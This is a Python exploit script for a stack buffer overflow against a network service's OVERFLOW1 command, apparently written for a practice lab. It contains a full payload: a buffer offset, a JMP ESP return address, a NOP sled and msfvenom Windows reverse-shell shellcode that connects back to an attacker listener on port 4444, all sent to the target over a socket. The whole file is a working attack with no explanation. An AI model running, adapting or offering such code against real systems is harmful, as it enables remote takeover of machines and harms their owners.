#!/usr/bin/env python3

import socket
import struct

def p32(data):
	return struct.pack("<I", data)

host, port = "10.10.209.4", 1337

all_chars = bytearray(range(1,256))

bad_chars = [
	b"\x07",
	b"\x2d",
	b"\x2e",
	b"\xa0",
	b"\xa1"
	b"\x00"
]

for bad_char in bad_chars:
	all_chars = all_chars.replace(bad_char, b"")

command = b"OVERFLOW1 "
length = 5000
offset = 1978
jmp_esp = p32(0x625011AF)

# msfvenom -p windows/shell_reverse_tcp LHOST=10.17.39.185 LPORT=4444 EXITFUNC=thread -b "\x07\x2d\x2e\xa0" -f py -v shellcode

shellcode =  b""
shellcode += b"\xb8\x76\xc6\x12\xfd\xda\xde\xd9\x74\x24\xf4"
shellcode += b"\x5b\x29\xc9\xb1\x52\x31\x43\x12\x03\x43\x12"
shellcode += b"\x83\xb5\xc2\xf0\x08\xc5\x23\x76\xf2\x35\xb4"
shellcode += b"\x17\x7a\xd0\x85\x17\x18\x91\xb6\xa7\x6a\xf7"
shellcode += b"\x3a\x43\x3e\xe3\xc9\x21\x97\x04\x79\x8f\xc1"
shellcode += b"\x2b\x7a\xbc\x32\x2a\xf8\xbf\x66\x8c\xc1\x0f"
shellcode += b"\x7b\xcd\x06\x6d\x76\x9f\xdf\xf9\x25\x0f\x6b"
shellcode += b"\xb7\xf5\xa4\x27\x59\x7e\x59\xff\x58\xaf\xcc"
shellcode += b"\x8b\x02\x6f\xef\x58\x3f\x26\xf7\xbd\x7a\xf0"
shellcode += b"\x8c\x76\xf0\x03\x44\x47\xf9\xa8\xa9\x67\x08"
shellcode += b"\xb0\xee\x40\xf3\xc7\x06\xb3\x8e\xdf\xdd\xc9"
shellcode += b"\x54\x55\xc5\x6a\x1e\xcd\x21\x8a\xf3\x88\xa2"
shellcode += b"\x80\xb8\xdf\xec\x84\x3f\x33\x87\xb1\xb4\xb2"
shellcode += b"\x47\x30\x8e\x90\x43\x18\x54\xb8\xd2\xc4\x3b"
shellcode += b"\xc5\x04\xa7\xe4\x63\x4f\x4a\xf0\x19\x12\x03"
shellcode += b"\x35\x10\xac\xd3\x51\x23\xdf\xe1\xfe\x9f\x77"
shellcode += b"\x4a\x76\x06\x80\xad\xad\xfe\x1e\x50\x4e\xff"
shellcode += b"\x37\x97\x1a\xaf\x2f\x3e\x23\x24\xaf\xbf\xf6"
shellcode += b"\xeb\xff\x6f\xa9\x4b\xaf\xcf\x19\x24\xa5\xdf"
shellcode += b"\x46\x54\xc6\x35\xef\xff\x3d\xde\x1a\x11\x1a"
shellcode += b"\xa7\x73\x13\x64\xc6\xdf\x9a\x82\x82\xcf\xca"                                         
shellcode += b"\x1d\x3b\x69\x57\xd5\xda\x76\x4d\x90\xdd\xfd"                                         
shellcode += b"\x62\x65\x93\xf5\x0f\x75\x44\xf6\x45\x27\xc3"                                         
shellcode += b"\x09\x70\x4f\x8f\x98\x1f\x8f\xc6\x80\xb7\xd8"                                         
shellcode += b"\x8f\x77\xce\x8c\x3d\x21\x78\xb2\xbf\xb7\x43"                                         
shellcode += b"\x76\x64\x04\x4d\x77\xe9\x30\x69\x67\x37\xb8"                                         
shellcode += b"\x35\xd3\xe7\xef\xe3\x8d\x41\x46\x42\x67\x18"                                         
shellcode += b"\x35\x0c\xef\xdd\x75\x8f\x69\xe2\x53\x79\x95"                                         
shellcode += b"\x53\x0a\x3c\xaa\x5c\xda\xc8\xd3\x80\x7a\x36"
shellcode += b"\x0e\x01\x9a\xd5\x9a\x7c\x33\x40\x4f\x3d\x5e"
shellcode += b"\x73\xba\x02\x67\xf0\x4e\xfb\x9c\xe8\x3b\xfe"
shellcode += b"\xd9\xae\xd0\x72\x71\x5b\xd6\x21\x72\x4e"

nop_sled = b"\x90" * 24

payload = b"".join([
	command,
	b"A" * offset,
	jmp_esp,

	nop_sled,
	shellcode,

	b"C" * ( length - len(jmp_esp) - offset - len(nop_sled) - len(shellcode)),
])

with socket.socket() as s:
	s.connect((host, port))
	s.send(payload)